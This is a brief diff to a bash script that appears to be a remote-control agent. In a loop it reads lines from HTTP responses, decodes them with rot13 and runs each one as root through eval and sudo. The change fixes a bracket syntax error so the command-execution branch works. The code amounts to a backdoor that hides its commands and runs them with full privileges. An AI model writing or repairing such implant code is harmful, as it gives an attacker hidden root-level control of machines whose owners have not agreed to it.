@@ -62,7 +62,7 @@ while true; do
     if [[ "$command" != "HTTP/1.1 200 OK" ]] && [[ "$command" != "Content-Length"* ]] && [[ "$command" != "Content-Type: text/plain; charset=utf-8" ]] && [[ -n "$command" ]]; then
       # Convert Cipher text to plain text
       command=$(rot13 "$command")
-      if ["$command" != "KEEP_ALIVE" ]; then
+      if [ "$command" != "KEEP_ALIVE" ]; then
         # Run the command
         result=$(eval "sudo $command")
         # Convert the result into cipher text
